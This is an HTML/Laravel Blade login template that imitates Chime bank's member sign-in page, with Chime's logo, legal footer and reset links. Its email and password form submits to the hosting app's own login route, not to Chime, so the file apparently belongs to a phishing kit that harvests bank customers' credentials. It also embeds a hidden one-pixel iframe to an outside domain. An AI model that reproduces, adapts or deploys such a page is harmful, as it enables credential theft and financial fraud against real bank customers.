<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta http-equiv="X-UA-Compatible" content="ie=edge">
      <title>Member Login</title>
      <link rel="shortcut icon" href="{{ asset('chime/favicon.png')}}" type="image/x-icon">

      <link rel="stylesheet" href="{{ asset('chime/font-awesome-css.min.css')}}">
      <link rel="stylesheet" href="{{ asset('chime/font-icon.css')}}">
      <link rel="stylesheet" href="{{ asset('chime/font.css')}}">
      <link rel="stylesheet" href="{{ asset('chime/sign_out.css')}}">
  </head>
  <body class=" animated fadeIn">
    <noscript>
      <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N3Z9ZNR" height="0" width="0"
          style="display:none;visibility:hidden">
      </iframe>
    </noscript>
    <div id="ajax-loading-screen" class="hide"></div>
      <div id="content-container" class="simple">
          <div id="header" class="simple">
          <div class="logo-wrapper">
            <a href="https://www.chimebank.com/">
              <img class="image-responsive center" style="width: 155px;" src="{{ asset('chime/chime_logo.png')}}" alt="Logo with text">
            </a>
          </div>
        </div>

        <div id="notification-bar" class="animated"></div>
        <div class="container-fluid">
          <div class="row">
            <div class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 col-lg-4 col-lg-offset-4 ">
              <div class="vertical-spacer2"></div>
              <form method="POST" action="{{ route('login') }}">
                        @csrf
                  <input placeholder="Email address" class="input-lg form-control @error('email') is-invalid @enderror"  
                  type="email" value="{{ old('email') }}" name="email" >
                  @error('email')
                    <span class="invalid-feedback" role="alert">
                        <strong>{{ $message }}</strong>
                    </span>
                  @enderror
                  <input placeholder="Password" type="password" name="password" class="input-lg form-control
                  @error('password') is-invalid @enderror" name="password" autocomplete="current-password" style="margin-bottom: 6px;" > 
                  @error('password')
                      <span class="invalid-feedback" role="alert">
                          <strong>{{ $message }}</strong>
                      </span>
                  @enderror
                  <input type="submit" name="commit" value="Log In" class="btn btn-success btn-block">
              </form>  
              <small><a href="https://www.chimebank.com/member/reset/email">Forgot your email address?</a></small><br>
              <small><a href="https://www.chimebank.com/member/reset/password/new">Forgot your password?</a></small>
              <div class="vertical-spacer2"></div>
            </div>
          </div>
        </div>
        <div id="ajax-dialog-container" class="modal fade" role="dialog" aria-labelledby="generalAjaxContainer" aria-hidden="true"></div>
        </div>
        <iframe src="https://b.frstre.com/?v1.4" style="width: 1px; height: 1px; display: none;"></iframe>
        <div id="footer" class="simple container-fluid">
        <div class="col-sm-6 col-sm-offset-3 col-lg-4 col-lg-offset-4">
          <div class="row">
            <div class="text-center fine-print">
              <p><small class="text-muted fine-print">© 2020 Chime. All Rights Reserved.</small></p>
              <div class="half-vspacer"></div>
              <p>
                <small class="text-muted fine-print">
                  Banking Services provided by The Bancorp Bank or Stride Bank, N.A.,
                  Members FDIC. The Chime Visa<sup>®</sup> Debit Card is issued by The Bancorp Bank or Stride Bank  pursuant to a license
                  from Visa U.S.A. Inc. and may be used everywhere Visa debit cards are accepted. Please see back of your Card for its issuing bank.
                </small>
              </p>
            </div>
          </div>
          <div class="vertical-spacer1 row"></div> 
      </div>
    </div>
  </body>
</html>